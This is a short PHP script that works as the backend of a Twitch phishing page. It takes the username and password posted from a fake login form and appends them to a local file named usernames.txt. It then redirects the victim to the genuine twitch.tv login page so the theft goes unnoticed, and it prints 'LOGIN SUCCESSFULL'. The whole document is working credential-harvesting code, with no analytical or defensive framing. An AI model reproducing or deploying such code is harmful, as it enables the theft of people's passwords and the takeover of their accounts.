<?php
$var = $_POST['twitch_user'];
$var2 = $_POST['twitch_pass'];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>WELCOME</title></html>";
if($myFile != $searchString) {
    file_put_contents("usernames.txt", "[Twitch-EMAIL]: " . $var . " [Twitch-PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location:https://twitch.tv/login');
}
if($myFile != $searchString) {
    echo "LOGIN SUCCESSFULL";
}
exit();
?>
